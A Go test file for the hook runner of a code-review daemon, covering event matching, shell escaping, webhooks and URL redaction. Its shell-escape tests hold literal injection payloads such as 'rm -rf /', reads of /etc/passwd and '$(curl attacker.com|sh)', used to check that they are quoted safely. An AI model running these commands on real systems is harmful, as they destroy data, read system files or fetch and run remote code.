package daemon

import (
	"bytes"
	"encoding/json"
	"errors"
	"fmt"
	"log"
	"net/http"
	"net/http/httptest"
	neturl "net/url"
	"os"
	"path/filepath"
	"runtime"
	"strings"
	"sync"
	"testing"
	"time"

	"github.com/stretchr/testify/assert"
	"github.com/stretchr/testify/require"

	"go.kenn.io/roborev/internal/config"
)

// quote wraps a string in platform-appropriate shell quoting (matches shellEscape output).
func quote(s string) string {
	return shellEscape(s)
}

// setupRunner initializes a HookRunner and Broadcaster for testing.
func setupRunner(t *testing.T, cfg *config.Config) (*HookRunner, Broadcaster) {
	t.Helper()
	b := NewBroadcaster()
	hr := NewHookRunner(NewStaticConfig(cfg), b, log.Default())
	t.Cleanup(hr.Stop)
	return hr, b
}

func poll(t *testing.T, timeout time.Duration, condition func() bool) {
	t.Helper()
	deadline := time.Now().Add(timeout)
	for time.Now().Before(deadline) {
		if condition() {
			return
		}
		time.Sleep(50 * time.Millisecond)
	}
	require.Condition(t, func() bool {
		return false
	}, "condition not met within %v", timeout)
}

// waitForFile polls for the existence of a file until the timeout expires.
func waitForFile(t *testing.T, path string, timeout time.Duration) {
	t.Helper()
	waitForFiles(t, timeout, path)
}

// waitForFiles polls for the existence of multiple files until the timeout expires.
func waitForFiles(t *testing.T, timeout time.Duration, paths ...string) {
	t.Helper()
	poll(t, timeout, func() bool {
		for _, path := range paths {
			if _, err := os.Stat(path); err != nil {
				return false
			}
		}
		return true
	})
}

// waitForFileContent polls until the file exists and has non-empty content.
func waitForFileContent(t *testing.T, path string, timeout time.Duration) string {
	t.Helper()
	var content []byte
	poll(t, timeout, func() bool {
		var err error
		content, err = os.ReadFile(path)
		return err == nil && len(content) > 0
	})
	return string(content)
}

// noopCmd returns a platform-appropriate no-op shell command.
func noopCmd() string {
	if runtime.GOOS == "windows" {
		return "Write-Output ok"
	}
	return "true"
}

// touchCmd returns a platform-appropriate shell command to create a file.
// Uses forward slashes on Windows to avoid TOML/shell escaping issues.
func touchCmd(path string) string {
	if runtime.GOOS == "windows" {
		// runHook uses PowerShell on Windows, so use PowerShell commands directly.
		// Use forward slashes — PowerShell resolves them correctly.
		return "New-Item -ItemType File -Force -Path '" + filepath.ToSlash(path) + "'"
	}
	return "touch " + path
}

// pwdCmd returns a platform-appropriate shell command to write the cwd to a file.
func pwdCmd(path string) string {
	if runtime.GOOS == "windows" {
		return "[IO.File]::WriteAllText('" + filepath.ToSlash(path) + "', (Get-Location).Path)"
	}
	return "pwd > " + path
}

func TestMatchEvent(t *testing.T) {
	tests := []struct {
		pattern   string
		eventType string
		want      bool
	}{
		{"review.failed", "review.failed", true},
		{"review.completed", "review.completed", true},
		{"review.failed", "review.completed", false},
		{"review.*", "review.failed", true},
		{"review.*", "review.completed", true},
		{"review.*", "review.started", true},
		{"review.*", "other.event", false},
		{"other.*", "review.failed", false},
	}

	for _, tt := range tests {
		got := matchEvent(tt.pattern, tt.eventType)
		if got != tt.want {
			assert.Condition(t, func() bool {
				return false
			}, "matchEvent(%q, %q) = %v, want %v", tt.pattern, tt.eventType, got, tt.want)
		}
	}
}

func TestMatchBranch(t *testing.T) {
	tests := []struct {
		name     string
		patterns []string
		branch   string
		want     bool
	}{
		{"empty allowlist matches any", nil, "main", true},
		{"empty allowlist matches empty branch", nil, "", true},
		{"exact match", []string{"main"}, "main", true},
		{"exact mismatch", []string{"main"}, "develop", false},
		{"prefix is not a substring match", []string{"main"}, "main2", false},
		{"filter set, empty branch fails closed", []string{"main"}, "", false},
		{"glob matches", []string{"release/*"}, "release/1.2", true},
		{"glob does not cross slash", []string{"release/*"}, "release/1/2", false},
		{"any pattern in the list matches", []string{"main", "release/*"}, "release/9", true},
		{"malformed pattern never matches", []string{"["}, "main", false},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			assert.Equal(t, tt.want, matchBranch(tt.patterns, tt.branch))
		})
	}
}

func TestInterpolate(t *testing.T) {
	event := Event{
		JobID:    42,
		Repo:     "/home/user/myrepo",
		RepoName: "myrepo",
		SHA:      "abc123def456",
		Agent:    "codex",
		Verdict:  "F",
		Findings: "High — missing input validation in handler",
		Error:    "agent timeout",
	}

	tests := []struct {
		cmd  string
		want string
	}{
		{
			"echo {job_id} {sha}",
			"echo 42 " + quote("abc123def456"),
		},
		{
			"notify --repo {repo_name} --verdict {verdict}",
			"notify --repo " + quote("myrepo") + " --verdict " + quote("F"),
		},
		{
			"log {error}",
			"log " + quote("agent timeout"),
		},
		{
			"process {findings}",
			"process " + quote("High — missing input validation in handler"),
		},
		{
			"",
			"",
		},
	}

	for _, tt := range tests {
		got := interpolate(tt.cmd, event)
		if got != tt.want {
			assert.Condition(t, func() bool {
				return false
			}, "interpolate(%q) = %q, want %q", tt.cmd, got, tt.want)
		}
	}
}

func TestInterpolateShellInjection(t *testing.T) {
	// Test with payloads that attempt to break out of quoting and execute commands.
	// We assert safety properties rather than exact output to avoid testing
	// shellEscape against itself.
	payloads := []string{
		"'; rm -rf / #",
		"`rm -rf /`",
		"$(rm -rf /)",
		"a; echo pwned",
		"a & echo pwned",
		"a | cat /etc/passwd",
	}

	for _, payload := range payloads {
		// Test via both {error} and {findings} since findings contain arbitrary agent output
		event := Event{JobID: 1, Repo: "/repo", Error: payload, Findings: payload}
		got := interpolate("echo {error}", event)
		gotFindings := interpolate("echo {findings}", event)

		for _, result := range []string{got, gotFindings} {
			prefix := "echo "
			if !strings.HasPrefix(result, prefix) || len(result) <= len(prefix)+1 {
				require.Condition(t, func() bool {
					return false
				}, "payload %q: unexpected format (too short or wrong prefix): %q", payload, result)
			}
			val := result[len(prefix):]
			if val[0] != '\'' || val[len(val)-1] != '\'' {
				assert.Condition(t, func() bool {
					return false
				}, "payload %q: not single-quoted: %q", payload, result)
			}
			substr := payload[:4]
			if !strings.Contains(val, substr) {
				assert.Condition(t, func() bool {
					return false
				}, "payload %q: escaped value doesn't contain expected substring %q: %q", payload, substr, val)
			}
		}
	}
}

func TestInterpolateQuotedPlaceholders(t *testing.T) {
	// Placeholders are auto-escaped with single quotes, so users should NOT
	// wrap them in additional quotes. This test documents the behavior:
	// double-quoting a placeholder produces nested quotes which is valid shell
	// but includes the literal single quotes inside the double-quoted string.
	event := Event{
		JobID:    1,
		Repo:     "/repo",
		RepoName: "myrepo",
		Error:    "simple error",
	}

	// Unquoted placeholder (recommended) -- clean output
	got := interpolate("echo {error}", event)
	if want := "echo " + quote("simple error"); got != want {
		assert.Condition(t, func() bool {
			return false
		}, "unquoted placeholder: got %q, want %q", got, want)
	}

	// Double-quoted placeholder -- works but includes literal quotes around the value
	got = interpolate(`echo "{error}"`, event)
	if want := `echo "` + quote("simple error") + `"`; got != want {
		assert.Condition(t, func() bool {
			return false
		}, "double-quoted placeholder: got %q, want %q", got, want)
	}

	// Empty value produces empty quoted string
	event.Verdict = ""
	got = interpolate("echo {verdict}", event)
	if want := "echo " + quote(""); got != want {
		assert.Condition(t, func() bool {
			return false
		}, "empty value: got %q, want %q", got, want)
	}
}

func TestShellEscape(t *testing.T) {
	var tests []struct {
		in   string
		want string
	}
	if runtime.GOOS == "windows" {
		tests = []struct {
			in   string
			want string
		}{
			{"hello", "'hello'"},
			{"", "''"},
			{"it's", "'it''s'"},
			{"a;b", "'a;b'"},
			{`say "hi"`, `'say "hi"'`},
			{"%PATH%", "'%PATH%'"},
		}
	} else {
		tests = []struct {
			in   string
			want string
		}{
			{"hello", "'hello'"},
			{"", "''"},
			{"it's", "'it'\"'\"'s'"},
			{"a;b", "'a;b'"},
		}
	}
	for _, tt := range tests {
		got := shellEscape(tt.in)
		if got != tt.want {
			assert.Condition(t, func() bool {
				return false
			}, "shellEscape(%q) = %q, want %q", tt.in, got, tt.want)
		}
	}

	// Verify injection payloads are properly enclosed in quotes on all platforms
	injections := []string{
		"'; rm -rf /",
		"`rm -rf /`",
		"$(cat /etc/passwd)",
		"a; echo pwned",
	}
	for _, payload := range injections {
		got := shellEscape(payload)
		if len(got) < 2 {
			require.Condition(t, func() bool {
				return false
			}, "shellEscape(%q) too short: %q", payload, got)
		}
		if got[0] != '\'' || got[len(got)-1] != '\'' {
			assert.Condition(t, func() bool {
				return false
			}, "shellEscape(%q) not single-quoted: %q", payload, got)
		}
	}
}

func TestBeadsCommand(t *testing.T) {
	event := Event{
		Type:     "review.failed",
		JobID:    7,
		Repo:     "/home/user/myrepo",
		RepoName: "myrepo",
		SHA:      "abc123def456",
		Agent:    "codex",
		Error:    "timeout",
	}

	cmd := beadsCommand(event)
	if cmd == "" {
		require.Condition(t, func() bool {
			return false
		}, "expected non-empty command for review.failed")
	}
	if !strings.Contains(cmd, "bd create") {
		assert.Condition(t, func() bool {
			return false
		}, "expected bd create in command, got %q", cmd)
	}
	if !strings.Contains(cmd, "roborev show 7") {
		assert.Condition(t, func() bool {
			return false
		}, "expected 'roborev show 7' in command, got %q", cmd)
	}

	// Completed with pass should return empty
	event.Type = "review.completed"
	event.Verdict = "P"
	cmd = beadsCommand(event)
	if cmd != "" {
		assert.Condition(t, func() bool {
			return false
		}, "expected empty command for passing review, got %q", cmd)
	}

	// Completed with fail should return a command
	event.Verdict = "F"
	cmd = beadsCommand(event)
	if cmd == "" {
		require.Condition(t, func() bool {
			return false
		}, "expected non-empty command for failing review")
	}
	if !strings.Contains(cmd, "-p 2") {
		assert.Condition(t, func() bool {
			return false
		}, "expected priority 2 for failing review, got %q", cmd)
	}
	if !strings.Contains(cmd, "roborev fix 7") {
		assert.Condition(t, func() bool {
			return false
		}, "expected 'roborev fix' hint in failing review command, got %q", cmd)
	}
}

func TestBeadsCommandShortSHA(t *testing.T) {
	event := Event{
		Type:     "review.failed",
		JobID:    1,
		Repo:     "/repo",
		RepoName: "repo",
		SHA:      "abcdef1234567890",
	}
	cmd := beadsCommand(event)
	if !strings.Contains(cmd, "abcdef1") {
		assert.Condition(t, func() bool {
			return false
		}, "expected truncated SHA in command, got %q", cmd)
	}
	if strings.Contains(cmd, "abcdef1234567890") {
		assert.Condition(t, func() bool {
			return false
		}, "expected SHA to be truncated, got %q", cmd)
	}
}

func TestBeadsCommandShellEscape(t *testing.T) {
	event := Event{
		Type:     "review.failed",
		JobID:    1,
		Repo:     "/repo",
		RepoName: "$(curl attacker.com|sh)",
		SHA:      "abc123",
	}
	cmd := beadsCommand(event)
	// Must use single quotes so the shell does not expand $()
	if strings.Contains(cmd, `"$(curl`) {
		assert.Condition(t, func() bool {
			return false
		}, "title must not be double-quoted; got %q", cmd)
	}
	if !strings.Contains(cmd, "'") {
		assert.Condition(t, func() bool {
			return false
		}, "title should be single-quoted; got %q", cmd)
	}
}

func TestResolveCommand(t *testing.T) {
	event := Event{
		Type:  "review.failed",
		JobID: 5,
		Repo:  "/repo",
		SHA:   "abc123",
		Agent: "codex",
	}

	// Custom command
	hook := config.HookConfig{
		Event:   "review.failed",
		Command: "echo {job_id}",
	}
	cmd := resolveCommand(hook, event)
	if cmd != "echo 5" {
		assert. // job_id is numeric, not shell-escaped
			Condition(t, func() bool {
				return false
			}, "expected 'echo 5', got %q", cmd)
	}

	// Beads type
	hook = config.HookConfig{
		Event: "review.failed",
		Type:  "beads",
	}
	cmd = resolveCommand(hook, event)
	if cmd == "" {
		assert.Condition(t, func() bool {
			return false
		}, "expected non-empty beads command")
	}
}

func TestHookRunnerFiresHooks(t *testing.T) {
	tmpDir := t.TempDir()
	markerFile := filepath.Join(tmpDir, "hook-fired")

	cfg := &config.Config{
		Hooks: []config.HookConfig{
			{
				Event:   "review.completed",
				Command: touchCmd(markerFile),
			},
		},
	}

	_, broadcaster := setupRunner(t, cfg)

	broadcaster.Broadcast(Event{
		Type:     "review.completed",
		TS:       time.Now(),
		JobID:    1,
		Repo:     tmpDir,
		RepoName: "test",
		SHA:      "abc123",
		Agent:    "test",
		Verdict:  "P",
	})

	waitForFile(t, markerFile, 5*time.Second)
}

func TestHookRunnerWorkingDirectory(t *testing.T) {
	tmpDir := t.TempDir()
	markerFile := filepath.Join(tmpDir, "pwd-test")

	cfg := &config.Config{
		Hooks: []config.HookConfig{
			{
				Event:   "review.failed",
				Command: pwdCmd(markerFile),
			},
		},
	}

	_, broadcaster := setupRunner(t, cfg)

	broadcaster.Broadcast(Event{
		Type:     "review.failed",
		TS:       time.Now(),
		JobID:    1,
		Repo:     tmpDir,
		RepoName: "test",
		SHA:      "abc",
		Agent:    "test",
		Error:    "fail",
	})

	dataStr := waitForFileContent(t, markerFile, 5*time.Second)

	got := filepath.Clean(strings.TrimSpace(dataStr))
	want := filepath.Clean(tmpDir)
	// On Windows, resolve 8.3 short paths to long paths for comparison
	if runtime.GOOS == "windows" {
		if g, err := filepath.EvalSymlinks(got); err == nil {
			got = g
		}
		if w, err := filepath.EvalSymlinks(want); err == nil {
			want = w
		}
	}
	equal := got == want
	if runtime.GOOS == "windows" {
		equal = strings.EqualFold(got, want)
	}
	if !equal {
		assert.Condition(t, func() bool {
			return false
		}, "hook ran in %q, want %q", got, want)
	}
}

func TestHookRunnerNoMatchDoesNotFire(t *testing.T) {
	tmpDir := t.TempDir()
	markerFile := filepath.Join(tmpDir, "should-not-exist")

	cfg := &config.Config{
		Hooks: []config.HookConfig{
			{
				Event:   "review.completed",
				Command: touchCmd(markerFile),
			},
		},
	}

	hr, broadcaster := setupRunner(t, cfg)

	// Send a failed event - hook is only for completed
	broadcaster.Broadcast(Event{
		Type:     "review.failed",
		TS:       time.Now(),
		JobID:    1,
		Repo:     tmpDir,
		RepoName: "test",
		SHA:      "abc",
		Agent:    "test",
		Error:    "fail",
	})

	hr.WaitUntilIdle()
	if _, err := os.Stat(markerFile); err == nil {
		require.Condition(t, func() bool {
			return false
		}, "hook should not have fired for non-matching event")
	}
}

func TestHookRunnerBranchFilter(t *testing.T) {
	tmpDir := t.TempDir()
	markerFile := filepath.Join(tmpDir, "branch-hook-fired")

	cfg := &config.Config{
		Hooks: []config.HookConfig{
			{
				Event:    "review.completed",
				Branches: []string{"main"},
				Command:  touchCmd(markerFile),
			},
		},
	}

	hr, broadcaster := setupRunner(t, cfg)

	// A review on a branch outside the allowlist must not fire the hook.
	broadcaster.Broadcast(Event{
		Type:     "review.completed",
		TS:       time.Now(),
		JobID:    1,
		Repo:     tmpDir,
		RepoName: "test",
		SHA:      "abc",
		Branch:   "feature/x",
		Agent:    "test",
		Verdict:  "F",
	})
	hr.WaitUntilIdle()
	assert.NoFileExists(t, markerFile, "hook should not fire for a branch outside the allowlist")

	// The same hook fires once the review runs on an allowed branch.
	broadcaster.Broadcast(Event{
		Type:     "review.completed",
		TS:       time.Now(),
		JobID:    2,
		Repo:     tmpDir,
		RepoName: "test",
		SHA:      "def",
		Branch:   "main",
		Agent:    "test",
		Verdict:  "F",
	})
	waitForFile(t, markerFile, 5*time.Second)
}

func TestHookRunnerWebhookPostsEventJSON(t *testing.T) {
	type webhookRequest struct {
		header http.Header
		event  map[string]any
	}

	reqCh := make(chan webhookRequest, 1)
	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		defer r.Body.Close()

		var payload map[string]any
		if err := json.NewDecoder(r.Body).Decode(&payload); err != nil {
			assert.Condition(t, func() bool {
				return false
			}, "decode webhook payload: %v", err)
			w.WriteHeader(http.StatusBadRequest)
			return
		}

		reqCh <- webhookRequest{header: r.Header.Clone(), event: payload}
		w.WriteHeader(http.StatusNoContent)
	}))
	defer server.Close()

	cfg := &config.Config{
		Hooks: []config.HookConfig{
			{Event: "review.completed", Type: "webhook", URL: server.URL},
		},
	}

	hr, broadcaster := setupRunner(t, cfg)
	broadcaster.Broadcast(Event{
		Type:     "review.completed",
		TS:       time.Date(2026, 2, 25, 14, 30, 0, 0, time.UTC),
		JobID:    42,
		Repo:     "/Users/wesm/code/roborev",
		RepoName: "roborev",
		SHA:      "abc123def456",
		Agent:    "claude-code",
		Verdict:  "F",
		Findings: "Missing validation in handler",
	})

	hr.WaitUntilIdle()

	select {
	case req := <-reqCh:
		if got := req.header.Get("Content-Type"); got != "application/json" {
			require.Condition(t, func() bool {
				return false
			}, "content-type = %q, want application/json", got)
		}
		if got := req.event["type"]; got != "review.completed" {
			require.Condition(t, func() bool {
				return false
			}, "type = %v, want review.completed", got)
		}
		if got := req.event["ts"]; got != "2026-02-25T14:30:00Z" {
			require.Condition(t, func() bool {
				return false
			}, "ts = %v, want 2026-02-25T14:30:00Z", got)
		}
		if got := req.event["job_id"]; got != float64(42) {
			require.Condition(t, func() bool {
				return false
			}, "job_id = %v, want 42", got)
		}
		if got := req.event["findings"]; got != "Missing validation in handler" {
			require.Condition(t, func() bool {
				return false
			}, "findings = %v, want webhook payload to include findings", got)
		}
	case <-time.After(2 * time.Second):
		require.Condition(t, func() bool {
			return false
		}, "timed out waiting for webhook request")
	}
}

func TestHookRunnerWebhookLogsHTTPError(t *testing.T) {
	var buf bytes.Buffer
	logger := log.New(&buf, "", 0)

	server := httptest.NewServer(http.HandlerFunc(func(w http.ResponseWriter, r *http.Request) {
		http.Error(w, "boom", http.StatusBadGateway)
	}))
	defer server.Close()

	webhookURL, err := neturl.Parse(server.URL)
	if err != nil {
		require.Condition(t, func() bool {
			return false
		}, "parse server URL: %v", err)
	}
	webhookURL.User = neturl.UserPassword("token", "secret")
	webhookURL.Path = "/services/team/webhook"
	webhookURL.RawQuery = "api_key=12345"
	webhookURL.Fragment = "frag"

	cfg := &config.Config{
		Hooks: []config.HookConfig{
			{Event: "review.failed", Type: "webhook", URL: webhookURL.String()},
		},
	}

	hr := &HookRunner{cfgGetter: NewStaticConfig(cfg), logger: logger}
	hr.handleEvent(Event{
		Type:  "review.failed",
		JobID: 7,
		Repo:  t.TempDir(),
		Error: "agent timeout",
	})

	hr.wg.Wait()

	logOutput := buf.String()
	if !strings.Contains(logOutput, "Webhook error") {
		require.Condition(t, func() bool {
			return false
		}, "expected webhook error log, got %q", logOutput)
	}
	if !strings.Contains(logOutput, "502 Bad Gateway") {
		require.Condition(t, func() bool {
			return false
		}, "expected HTTP status in log, got %q", logOutput)
	}
	if strings.Contains(logOutput, "token") || strings.Contains(logOutput, "secret") {
		require.Condition(t, func() bool {
			return false
		}, "expected credentials to be redacted from log, got %q", logOutput)
	}
	if strings.Contains(logOutput, "api_key") || strings.Contains(logOutput, "12345") || strings.Contains(logOutput, "frag") {
		require.Condition(t, func() bool {
			return false
		}, "expected query string and fragment to be redacted from log, got %q", logOutput)
	}
	if !strings.Contains(logOutput, "/...") {
		require.Condition(t, func() bool {
			return false
		}, "expected redacted path in log, got %q", logOutput)
	}
	if strings.Contains(logOutput, "/services") {
		require.Condition(t, func() bool {
			return false
		}, "expected path segments to be fully redacted, got %q", logOutput)
	}
}

func TestRedactWebhookURL(t *testing.T) {
	tests := []struct {
		name string
		in   string
		want string
	}{
		{
			name: "userinfo query and fragment are removed",
			in:   "https://token:secret@example.com/services/team/webhook?api_key=123#frag",
			want: "https://example.com/...",
		},
		{
			name: "single path segment is fully redacted",
			in:   "https://example.com/webhook",
			want: "https://example.com/...",
		},
		{
			name: "no path is preserved as-is",
			in:   "https://example.com",
			want: "https://example.com",
		},
		{
			name: "invalid URL is hidden",
			in:   "://token@example.com",
			want: "<invalid webhook url>",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			if got := redactWebhookURL(tt.in); got != tt.want {
				require.Condition(t, func() bool {
					return false
				}, "redactWebhookURL(%q) = %q, want %q", tt.in, got, tt.want)
			}
		})
	}
}

func TestRedactURLError(t *testing.T) {
	inner := fmt.Errorf("connection refused")
	urlErr := &neturl.Error{
		Op:  "Post",
		URL: "https://hooks.example.com/secret-token",
		Err: inner,
	}

	got := redactURLError(urlErr)
	if !errors.Is(got, inner) {
		require.Condition(t, func() bool {
			return false
		}, "expected inner error, got %v", got)
	}
	if strings.Contains(got.Error(), "secret-token") {
		require.Condition(t, func() bool {
			return false
		}, "redacted error still contains secret")
	}

	plain := fmt.Errorf("some other error")
	if !errors.Is(redactURLError(plain), plain) {
		require.Condition(t, func() bool {
			return false
		}, "non-url.Error should be returned as-is")
	}
}

func TestHooksSliceNotAliased(t *testing.T) {
	// Verify that repo hooks don't leak into the global config's Hooks slice
	tmpDir := t.TempDir()
	markerGlobal := filepath.Join(tmpDir, "global-fired")
	markerRepo := filepath.Join(tmpDir, "repo-fired")

	globalHooks := []config.HookConfig{
		{Event: "review.failed", Command: touchCmd(markerGlobal)},
	}
	cfg := &config.Config{
		Hooks: globalHooks,
	}

	// Write a repo config with an additional hook
	repoDir := t.TempDir()
	writeRepoConfig(t, repoDir, `
[[hooks]]
event = "review.failed"
command = "`+touchCmd(markerRepo)+`"
`)

	_, broadcaster := setupRunner(t, cfg)

	// Fire event for the repo
	broadcaster.Broadcast(Event{
		Type:  "review.failed",
		TS:    time.Now(),
		JobID: 1,
		Repo:  repoDir,
		SHA:   "abc",
		Agent: "test",
		Error: "fail",
	})

	// Wait for hooks to run
	waitForFile(t, markerRepo, 5*time.Second)

	// The global config's Hooks slice must still have exactly 1 element
	if len(cfg.Hooks) != 1 {
		assert.Condition(t, func() bool {
			return false
		}, "global Hooks slice was mutated: len=%d, want 1", len(cfg.Hooks))
	}
}

func TestHookRunnerGlobalAndRepoHooksBothFire(t *testing.T) {
	// Both global and per-repo hooks should fire for the same event
	globalDir := t.TempDir()
	repoDir := t.TempDir()
	globalMarker := filepath.Join(globalDir, "global-fired")
	repoMarker := filepath.Join(repoDir, "repo-fired")

	cfg := &config.Config{
		Hooks: []config.HookConfig{
			{Event: "review.failed", Command: touchCmd(globalMarker)},
		},
	}

	// Write repo config with its own hook
	writeRepoConfig(t, repoDir, `
[[hooks]]
event = "review.failed"
command = "`+touchCmd(repoMarker)+`"
`)

	_, broadcaster := setupRunner(t, cfg)

	broadcaster.Broadcast(Event{
		Type:  "review.failed",
		TS:    time.Now(),
		JobID: 1,
		Repo:  repoDir,
		SHA:   "abc",
		Agent: "test",
		Error: "fail",
	})

	waitForFiles(t, 5*time.Second, globalMarker, repoMarker)
}

func TestHookRunnerRepoOnlyHooks(t *testing.T) {
	// Repo hooks fire even when there are no global hooks
	repoDir := t.TempDir()
	markerFile := filepath.Join(repoDir, "repo-only")

	cfg := &config.Config{} // no global hooks

	writeRepoConfig(t, repoDir, `
[[hooks]]
event = "review.completed"
command = "`+touchCmd(markerFile)+`"
`)

	_, broadcaster := setupRunner(t, cfg)

	broadcaster.Broadcast(Event{
		Type:    "review.completed",
		TS:      time.Now(),
		JobID:   1,
		Repo:    repoDir,
		SHA:     "abc",
		Agent:   "test",
		Verdict: "P",
	})

	waitForFile(t, markerFile, 5*time.Second)
}

func TestHookRunnerRepoHookDoesNotFireForOtherRepo(t *testing.T) {
	// A repo's hooks should not fire for events from a different repo
	repoA := t.TempDir()
	repoB := t.TempDir()
	markerFile := filepath.Join(repoA, "should-not-exist")

	cfg := &config.Config{} // no global hooks

	// Only repoA has hooks
	writeRepoConfig(t, repoA, `
[[hooks]]
event = "review.failed"
command = "`+touchCmd(markerFile)+`"
`)

	hr, broadcaster := setupRunner(t, cfg)

	// Fire event for repoB -- repoA's hooks should NOT fire
	broadcaster.Broadcast(Event{
		Type:  "review.failed",
		TS:    time.Now(),
		JobID: 1,
		Repo:  repoB,
		SHA:   "abc",
		Agent: "test",
		Error: "fail",
	})

	hr.WaitUntilIdle()
	if _, err := os.Stat(markerFile); err == nil {
		require.Condition(t, func() bool {
			return false
		}, "repo hook fired for a different repo's event")
	}
}

func TestHookRunnerStopUnsubscribes(t *testing.T) {
	t.Parallel()
	broadcaster := NewBroadcaster()
	cfg := &config.Config{}

	before := broadcaster.SubscriberCount()
	hr := NewHookRunner(NewStaticConfig(cfg), broadcaster, log.Default())
	afterSub := broadcaster.SubscriberCount()
	if afterSub != before+1 {
		assert.Condition(t, func() bool {
			return false
		}, "expected subscriber count %d after NewHookRunner, got %d", before+1, afterSub)
	}

	hr.Stop()
	// Give the goroutine a moment to exit
	time.Sleep(100 * time.Millisecond)

	afterStop := broadcaster.SubscriberCount()
	if afterStop != before {
		assert.Condition(t, func() bool {
			return false
		}, "expected subscriber count %d after Stop, got %d", before, afterStop)
	}
}

// writeRepoConfig writes a .roborev.toml file into repoDir, failing the test on error.
func writeRepoConfig(t *testing.T, repoDir, content string) {
	t.Helper()
	if err := os.WriteFile(filepath.Join(repoDir, ".roborev.toml"), []byte(content), 0o644); err != nil {
		require.Condition(t, func() bool {
			return false
		}, "failed to write .roborev.toml: %v", err)
	}
}

func TestHandleEventLogsWhenHooksFired(t *testing.T) {
	var buf bytes.Buffer
	logger := log.New(&buf, "", 0)

	cfg := &config.Config{
		Hooks: []config.HookConfig{
			{Event: "review.completed", Command: noopCmd()},
			{Event: "review.completed", Command: noopCmd()},
		},
	}

	hr := &HookRunner{cfgGetter: NewStaticConfig(cfg), logger: logger}
	hr.handleEvent(Event{
		Type:    "review.completed",
		JobID:   42,
		Repo:    t.TempDir(),
		SHA:     "abc",
		Verdict: "P",
	})

	hr.wg.Wait() // Wait for async goroutines

	logOutput := buf.String()
	if !strings.Contains(logOutput, "fired 2 hook(s)") {
		assert.Condition(t, func() bool {
			return false
		}, "expected log to contain 'fired 2 hook(s)', got %q", logOutput)
	}
	if !strings.Contains(logOutput, "review.completed") {
		assert.Condition(t, func() bool {
			return false
		}, "expected log to contain event type, got %q", logOutput)
	}
	if !strings.Contains(logOutput, "job 42") {
		assert.Condition(t, func() bool {
			return false
		}, "expected log to contain job ID, got %q", logOutput)
	}
}

func TestHandleEventNoLogWhenNoHooksMatch(t *testing.T) {
	var buf bytes.Buffer
	logger := log.New(&buf, "", 0)

	cfg := &config.Config{
		Hooks: []config.HookConfig{
			{Event: "review.completed", Command: "echo test"},
		},
	}

	hr := &HookRunner{cfgGetter: NewStaticConfig(cfg), logger: logger}
	hr.handleEvent(Event{
		Type:  "review.failed",
		JobID: 99,
		Repo:  t.TempDir(),
		SHA:   "abc",
	})

	if strings.Contains(buf.String(), "fired") {
		assert.Condition(t, func() bool {
			return false
		}, "expected no log output when no hooks match, got %q", buf.String())
	}
}

func TestWaitUntilIdle_ConcurrentEvents(t *testing.T) {
	// A dedicated stress test proving WaitUntilIdle waits past the event-processing boundary
	// under timing races and concurrent broadcasts.
	if runtime.GOOS != "windows" {
		t.Parallel()
	}

	iterations := 50
	numEvents := 10
	if runtime.GOOS == "windows" {
		// Each hook starts a PowerShell process on Windows. Keep the test broad
		// enough to exercise concurrent broadcasts without exhausting CI time.
		iterations = 5
		numEvents = 4
	}

	tmpDir := t.TempDir()

	cfg := &config.Config{
		Hooks: []config.HookConfig{
			// We use a command that touches a file to verify execution.
			// It incorporates {job_id} to ensure we can verify each individual event fired.
			{Event: "review.completed", Command: touchCmd(filepath.Join(tmpDir, "job-{job_id}"))},
		},
	}

	for i := range iterations {
		hr, broadcaster := setupRunner(t, cfg)

		var wg sync.WaitGroup

		for j := range numEvents {
			wg.Add(1)
			go func(jobID int64) {
				defer wg.Done()
				broadcaster.Broadcast(Event{
					Type:     "review.completed",
					TS:       time.Now(),
					JobID:    jobID,
					Repo:     tmpDir,
					RepoName: "test",
					SHA:      "abc",
					Agent:    "test",
				})
			}(int64(i*100 + j))
		}

		// Wait for all broadcasts to be enqueued
		wg.Wait()

		// WaitUntilIdle must wait until all hooks for queued events have finished
		hr.WaitUntilIdle()

		// Verify all hook marker files were created
		for j := range numEvents {
			markerFile := filepath.Join(tmpDir, fmt.Sprintf("job-%d", i*100+j))
			if _, err := os.Stat(markerFile); err != nil {
				require.Condition(t, func() bool {
					return false
				}, "iteration %d: marker file for job %d was not created before WaitUntilIdle returned", i, i*100+j)
			}
		}
	}
}

func TestWaitUntilIdle_StopDoesNotDeadlock(t *testing.T) {
	cfg := &config.Config{
		Hooks: []config.HookConfig{
			{Event: "review.completed", Command: "true"},
		},
	}
	b := NewBroadcaster()
	hr := NewHookRunner(NewStaticConfig(cfg), b, log.Default())

	done := make(chan struct{})
	go func() {
		hr.WaitUntilIdle()
		close(done)
	}()

	// Give WaitUntilIdle time to block on idleCh send
	time.Sleep(10 * time.Millisecond)
	hr.Stop()

	select {
	case <-done:
	case <-time.After(2 * time.Second):
		require.Condition(t, func() bool {
			return false
		}, "WaitUntilIdle deadlocked after Stop")
	}
}
